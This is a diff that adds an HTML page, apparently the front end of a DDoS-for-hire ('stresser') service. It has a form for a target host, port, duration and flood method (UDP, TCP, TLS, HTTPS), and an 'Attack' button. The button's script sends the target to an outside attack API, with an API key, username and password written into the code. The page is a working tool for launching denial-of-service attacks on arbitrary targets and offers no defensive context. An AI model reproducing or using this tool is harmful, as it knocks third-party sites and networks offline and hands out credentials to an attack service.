@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Api Ddos</title>
+    <link rel="shortcut icon" type="image/x-icon" href="https://files.catbox.moe/yysv6i.jpg">
+    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body, html {
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #121212;
+        }
+
+        .form-container {
+            width: 400px;
+            background: linear-gradient(#212121, #212121) padding-box,
+                        linear-gradient(145deg, transparent 35%, #e81cff, #40c9ff) border-box;
+            border: 2px solid transparent;
+            padding: 32px 24px;
+            font-size: 14px;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            border-radius: 16px;
+        }
+
+        .form-container h2 {
+            text-align: center;
+            color: #fff;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .form-group label {
+            color: #717171;
+            font-weight: 600;
+            font-size: 12px;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 12px 16px;
+            border-radius: 8px;
+            color: #fff;
+            background-color: transparent;
+            border: 1px solid #414141;
+            box-sizing: border-box;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #e81cff;
+        }
+
+        .form-container button {
+            padding: 12px;
+            background-color: #313131;
+            color: #717171;
+            border: 1px solid #414141;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        .form-container button:hover {
+            background-color: #fff;
+            color: #000;
+        }
+
+        #output {
+            width: 100%;
+            height: 200px;
+            overflow-y: auto;
+            background-color: #212121;
+            color: white;
+            border: 1px solid #414141;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 12px;
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="form-container">
+        <h2>Stress Ddos</h2>
+        <div class="form-group">
+            <label for="host">Target</label>
+            <input type="text" id="host" placeholder="Target..." required>
+        </div>
+        <div class="form-group">
+            <label for="port">Port</label>
+            <input type="text" id="port" placeholder="Port..." required>
+        </div>
+        <div class="form-group">
+            <label for="time">Time</label>
+            <input type="number" id="time" placeholder="Time..." required>
+        </div>
+        <div class="form-group">
+            <label for="method">Method</label>
+            <select id="method" required>
+                <option value="udpmix-api">UDP</option>
+                <option value="tcp-api">TCP</option>
+                <option value="gudp-api">GUDP</option>
+                <option value="tlsdeath-api">TLS</option>
+                <option value="https-api">HTTPS</option>
+            </select>
+        </div>
+        <button onclick="submitData()">Attack</button>
+        <div id="output"></div>
+    </div>
+
+    <script>
+        function submitData() {
+            const API_URL = "http://api.hytermix.click:8080/";
+            const API_KEY = "deepxkill";
+            const PASSWORD = "ffffd3r4r";
+            const API_USERNAME = "rbvrtbt";
+
+            const host = document.getElementById("host").value;
+            const port = document.getElementById("port").value;
+            const time_duration = document.getElementById("time").value;
+            const method = document.getElementById("method").value;
+
+            const dataddos = new URLSearchParams({
+                key: API_KEY,
+                username: API_USERNAME,
+                password: PASSWORD,
+                host: host,
+                port: port,
+                time: time_duration,
+                method: method
+            });
+
+            const urlWithParams = `${API_URL}?${dataddos.toString()}`;
+
+            fetch(urlWithParams, {
+                method: "GET",  // Use GET request method
+                headers: {
+                    "Content-Type": "application/json"
+                },
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! Status: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+            })
+            .catch(error => {
+                document.getElementById("output").innerText = "Error: " + error.message;
+            });
+        }
+    </script>
+</body>
+  </html>
